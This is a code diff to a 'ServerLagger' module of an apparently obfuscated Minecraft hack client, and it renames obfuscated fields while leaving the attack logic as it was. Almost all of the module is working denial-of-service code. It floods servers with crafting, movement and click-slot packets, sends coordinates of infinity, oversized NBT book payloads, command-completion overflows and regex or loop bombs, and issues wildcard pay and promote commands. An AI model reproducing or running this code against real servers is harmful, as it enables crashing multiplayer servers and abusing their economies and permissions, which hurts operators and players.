@@ -95,16 +95,16 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
         this.ticks = 0;
         switch (this.mode.getValue().ordinal()) {
             case 1: {
-                if (!(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.field_7512 instanceof CraftingScreenHandler) || mc.method_1562() == null) {
+                if (!(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.field_7512 instanceof CraftingScreenHandler) || mc.method_1562() == null) {
                     return;
                 }
                 try {
-                    List recipeResultCollectionList = ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.method_3130().method_1393();
+                    List recipeResultCollectionList = ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.method_3130().method_1393();
                     for (RecipeResultCollection recipeResultCollection : recipeResultCollectionList) {
                         for (RecipeEntry recipe : recipeResultCollection.method_2648(true)) {
                             int i = 0;
                             while ((double)i < this.craftPackets.getValue()) {
-                                mc.method_1562().method_52787((Packet)new CraftRequestC2SPacket(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.field_7512.field_7763, recipe, true));
+                                mc.method_1562().method_52787((Packet)new CraftRequestC2SPacket(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.field_7512.field_7763, recipe, true));
                                 ++i;
                             }
                         }
@@ -128,8 +128,8 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
                 break;
             }
             case 3: {
-                Vec3d pos = new Vec3d(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.method_23317(), ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.method_23318(), ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.method_23321());
-                BlockHitResult bhr = new BlockHitResult(pos, Direction.field_11033, BlockPos.method_49638((Position)pos), false);
+                Vec3d pos = new Vec3d(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getX(), ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getY(), ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getZ());
+                BlockHitResult bhr = new BlockHitResult(pos, Direction.DOWN, BlockPos.method_49638((Position)pos), false);
                 int i = 0;
                 while ((double)i < this.sequencePackets.getValue()) {
                     mc.method_1562().method_52787((Packet)new PlayerInteractBlockC2SPacket(Hand.field_5808, bhr, -1));
@@ -142,7 +142,7 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
                     return;
                 }
                 try {
-                    Vec3d current_pos = ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.method_19538();
+                    Vec3d current_pos = ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.method_19538();
                     int i = 0;
                     while ((double)i < this.movementPackets.getValue()) {
                         PlayerMoveC2SPacket.Full move_packet = new PlayerMoveC2SPacket.Full(current_pos.field_1352 + this.getDistributedRandom(1.0), current_pos.field_1351 + this.getDistributedRandom(1.0), current_pos.field_1350 + this.getDistributedRandom(1.0), (float)ServerLagger_xbIbOIunYFUorlZcLJkD.rndD(90.0), (float)ServerLagger_xbIbOIunYFUorlZcLJkD.rndD(180.0), true);
@@ -164,7 +164,7 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
                 String partialCommand = "msg @a[nbt={PAYLOAD}]".replace("{PAYLOAD}", overflow);
                 int i = 0;
                 while ((double)i < this.commandPackets.getValue()) {
-                    ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.field_3944.method_52787((Packet)new RequestCommandCompletionsC2SPacket(0, partialCommand));
+                    ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.field_3944.method_52787((Packet)new RequestCommandCompletionsC2SPacket(0, partialCommand));
                     ++i;
                 }
                 if (!this.smartDisable.getValue()) break;
@@ -175,7 +175,7 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
                 if (!(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1755 instanceof LecternScreen)) {
                     return;
                 }
-                mc.method_1562().method_52787((Packet)new ClickSlotC2SPacket(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.field_7512.field_7763, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.field_7512.method_37421(), 0, 0, SlotActionType.field_7794, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.field_7512.method_34255().method_7972(), Int2ObjectMaps.emptyMap()));
+                mc.method_1562().method_52787((Packet)new ClickSlotC2SPacket(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.field_7512.field_7763, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.field_7512.method_37421(), 0, 0, SlotActionType.field_7794, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.field_7512.method_34255().method_7972(), Int2ObjectMaps.emptyMap()));
                 if (!this.smartDisable.getValue()) break;
                 this.disable();
                 break;
@@ -184,14 +184,14 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
                 int i = 0;
                 while ((double)i < this.interactPackets.getValue()) {
                     Vec3d cpos = this.pickRandomPos();
-                    mc.method_1562().method_52787((Packet)new PlayerInteractBlockC2SPacket(Hand.field_5808, new BlockHitResult(cpos, Direction.field_11033, BlockPos.method_49638((Position)cpos), false), 0));
+                    mc.method_1562().method_52787((Packet)new PlayerInteractBlockC2SPacket(Hand.field_5808, new BlockHitResult(cpos, Direction.DOWN, BlockPos.method_49638((Position)cpos), false), 0));
                     ++i;
                 }
                 break;
             }
             case 7: {
                 Vec3d oob = new Vec3d(Double.POSITIVE_INFINITY, 255.0, Double.NEGATIVE_INFINITY);
-                mc.method_1562().method_52787((Packet)new PlayerInteractBlockC2SPacket(Hand.field_5808, new BlockHitResult(oob, Direction.field_11033, BlockPos.method_49638((Position)oob), false), 0));
+                mc.method_1562().method_52787((Packet)new PlayerInteractBlockC2SPacket(Hand.field_5808, new BlockHitResult(oob, Direction.DOWN, BlockPos.method_49638((Position)oob), false), 0));
                 break;
             }
             case 8: {
@@ -207,14 +207,14 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
                 REAL.put(0, new ItemStack((ItemConvertible)Items.field_8264, 1));
                 int i = 0;
                 while ((double)i < this.clickSlotPackets.getValue()) {
-                    mc.method_1562().method_52787((Packet)new ClickSlotC2SPacket(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.field_7512.field_7763, 123344, 2957234, 2859623, SlotActionType.field_7790, new ItemStack((ItemConvertible)Items.field_8162, -1), REAL));
+                    mc.method_1562().method_52787((Packet)new ClickSlotC2SPacket(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.field_7512.field_7763, 123344, 2957234, 2859623, SlotActionType.field_7790, new ItemStack((ItemConvertible)Items.field_8162, -1), REAL));
                     ++i;
                 }
                 break;
             }
             case 10: {
                 for (double i = 0.0; i < this.aacPackets.getValue(); i += 1.0) {
-                    mc.method_1562().method_52787((Packet)new PlayerMoveC2SPacket.PositionAndOnGround(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.method_23317() + 9412.0 * i, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.method_23318() + 9412.0 * i, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.method_23321() + 9412.0 * i, true));
+                    mc.method_1562().method_52787((Packet)new PlayerMoveC2SPacket.PositionAndOnGround(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getX() + 9412.0 * i, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getY() + 9412.0 * i, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getZ() + 9412.0 * i, true));
                 }
                 if (!this.smartDisable.getValue()) break;
                 this.disable();
@@ -222,7 +222,7 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
             }
             case 11: {
                 for (double i = 0.0; i < this.aacPackets.getValue(); i += 1.0) {
-                    mc.method_1562().method_52787((Packet)new PlayerMoveC2SPacket.PositionAndOnGround(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.method_23317() + 500000.0 * i, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.method_23318() + 500000.0 * i, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.method_23321() + 500000.0 * i, true));
+                    mc.method_1562().method_52787((Packet)new PlayerMoveC2SPacket.PositionAndOnGround(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getX() + 500000.0 * i, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getY() + 500000.0 * i, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getZ() + 500000.0 * i, true));
                 }
                 if (!this.smartDisable.getValue()) break;
                 this.disable();
@@ -248,7 +248,7 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
                 break;
             }
             case 15: {
-                if (!ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.method_31549().field_7477) {
+                if (!ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.method_31549().field_7477) {
                     if (this.smartDisable.getValue()) {
                         this.disable();
                     }
@@ -271,7 +271,7 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
                 break;
             }
             case 16: {
-                Entity vehicle = ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.method_5854();
+                Entity vehicle = ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.method_5854();
                 if (vehicle == null) {
                     if (this.smartDisable.getValue()) {
                         this.disable();
@@ -289,14 +289,14 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
                 break;
             }
             case 17: {
-                Entity vehicle = ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.method_5854();
+                Entity vehicle = ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.method_5854();
                 if (vehicle == null) {
                     if (this.smartDisable.getValue()) {
                         this.disable();
                     }
                     return;
                 }
-                BlockPos start = ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.method_24515();
+                BlockPos start = ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.method_24515();
                 Vec3d end = new Vec3d((double)start.method_10263() + 0.5, (double)(start.method_10264() + 1), (double)start.method_10260() + 0.5);
                 vehicle.method_30634(end.field_1352, end.field_1351 - 1.0, end.field_1350);
                 int i = 0;
@@ -309,41 +309,41 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
             case 20: {
                 int index = 0;
                 while ((double)index < this.offhandPackets.getValue()) {
-                    ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.field_3944.method_52787((Packet)new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.field_12969, BlockPos.field_10980, Direction.field_11036));
-                    ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.field_3944.method_52787((Packet)new PlayerMoveC2SPacket.OnGroundOnly(true));
+                    ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.field_3944.method_52787((Packet)new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.field_12969, BlockPos.field_10980, Direction.UP));
+                    ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.field_3944.method_52787((Packet)new PlayerMoveC2SPacket.OnGroundOnly(true));
                     ++index;
                 }
                 break;
             }
             case 18: {
-                ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.field_3944.method_45731("/calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<255;c++){}}}}");
+                ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.field_3944.method_45731("/calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<255;c++){}}}}");
                 if (!this.smartDisable.getValue()) break;
                 this.disable();
                 break;
             }
             case 19: {
-                for (double yPos = ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.method_23318(); yPos < 255.0; yPos += 5.0) {
-                    ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.field_3944.method_52787((Packet)new PlayerMoveC2SPacket.PositionAndOnGround(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.method_23317(), yPos, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.method_23321(), true));
+                for (double yPos = ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getY(); yPos < 255.0; yPos += 5.0) {
+                    ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.field_3944.method_52787((Packet)new PlayerMoveC2SPacket.PositionAndOnGround(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getX(), yPos, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getZ(), true));
                 }
                 for (double i = 0.0; i < 6685.0; i += 5.0) {
-                    ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.field_3944.method_52787((Packet)new PlayerMoveC2SPacket.PositionAndOnGround(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.method_23317() + i, 255.0, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.method_23321() + i, true));
+                    ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.field_3944.method_52787((Packet)new PlayerMoveC2SPacket.PositionAndOnGround(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getX() + i, 255.0, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getZ() + i, true));
                 }
                 break;
             }
             case 21: {
-                ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.field_3944.method_45731("mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
+                ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.field_3944.method_45731("mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
                 if (!this.smartDisable.getValue()) break;
                 this.disable();
                 break;
             }
             case 22: {
-                ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.field_3944.method_45731("pay * a a");
+                ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.field_3944.method_45731("pay * a a");
                 if (!this.smartDisable.getValue()) break;
                 this.disable();
                 break;
             }
             case 23: {
-                ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.field_3944.method_45731("promote * a");
+                ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.field_3944.method_45731("promote * a");
                 if (!this.smartDisable.getValue()) break;
                 this.disable();
             }
@@ -359,7 +359,7 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
                 for (int i = 0; i < 50; ++i) {
                     pages.add(mm255);
                 }
-                mc.method_1562().method_52787((Packet)new BookUpdateC2SPacket(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.method_31548().field_7545, pages, Optional.of(title)));
+                mc.method_1562().method_52787((Packet)new BookUpdateC2SPacket(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.method_31548().field_7545, pages, Optional.of(title)));
                 break;
             }
             case 14: {
@@ -379,7 +379,7 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
                     tag.method_10566("title", (NbtElement)NbtString.method_23256((String)RandomStringUtils.randomAlphabetic(25564)));
                     tag.method_10566("pages", (NbtElement)list);
                     book.method_7980(tag);
-                    ServerLagger_xbIbOIunYFUorlZcLJkD.mc.field_1724.field_3944.method_52787((Packet)new CreativeInventoryActionC2SPacket(this.slot, book));
+                    ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.field_3944.method_52787((Packet)new CreativeInventoryActionC2SPacket(this.slot, book));
                 }
                 break;
             }
